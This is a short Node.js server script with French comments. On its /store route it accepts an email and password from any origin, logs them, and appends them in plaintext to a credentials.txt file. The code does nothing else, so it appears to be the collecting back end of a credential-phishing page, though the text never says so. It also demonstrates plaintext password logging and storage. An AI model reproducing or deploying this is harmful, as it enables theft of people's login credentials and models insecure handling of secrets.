const http = require('http');
const fs = require('fs');
const path = require('path');

const requestListener = (req, res) => {
    console.log(`Requête reçue : Méthode ${req.method}, URL ${req.url}`);

    // En-têtes CORS pour permettre les requêtes depuis un autre domaine
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Gérer la requête OPTIONS (pré-vol)
    if (req.method === 'OPTIONS') {
        res.writeHead(204);  // Pas de contenu
        res.end();
        return;
    }

    // Traiter la requête POST sur la route /store
    if (req.method === 'POST' && req.url === '/store') {
        let body = '';

        // Recevoir les données envoyées par le client
        req.on('data', chunk => {
            body += chunk.toString();  // Accumuler les données reçues
        });

        req.on('end', () => {
            console.log('Données reçues :', body);  // Log des données reçues

            try {
                // Parse le corps de la requête
                const data = JSON.parse(body);
                const { email, password } = data;

                // Vérification de l'email et du mot de passe
                if (!email || !password || email.trim() === "" || password.trim() === "") {
                    console.log("Erreur : Email ou mot de passe vide");
                    res.writeHead(400, { 'Content-Type': 'text/plain' });
                    res.end('Erreur : Email et mot de passe requis.');
                    return;
                }

                // Spécifier le chemin complet du fichier credentials.txt
                const filePath = path.join(__dirname, 'credentials.txt');
                
                // Créer une entrée à ajouter au fichier
                const entry = `Email: ${email}, Password: ${password}\n`;

                // Log avant d'écrire dans le fichier
                console.log("Écriture des données dans le fichier credentials.txt...");

                // Écriture des données dans le fichier credentials.txt
                fs.appendFile(filePath, entry, (err) => {
                    if (err) {
                        console.error('Erreur lors de l\'écriture dans le fichier :', err);
                        res.writeHead(500, { 'Content-Type': 'text/plain' });
                        res.end('Erreur lors de l\'enregistrement.');
                    } else {
                        console.log('Données enregistrées avec succès.');
                        res.writeHead(200, { 'Content-Type': 'text/plain' });
                        res.end('Informations enregistrées avec succès.');
                    }
                });
            } catch (err) {
                console.error('Erreur JSON :', err);
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Données JSON invalides.' }));
            }
        });
    } else {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Route non trouvée.');
    }
};

const server = http.createServer(requestListener);

const PORT = 3001;
server.listen(PORT, () => {
    console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
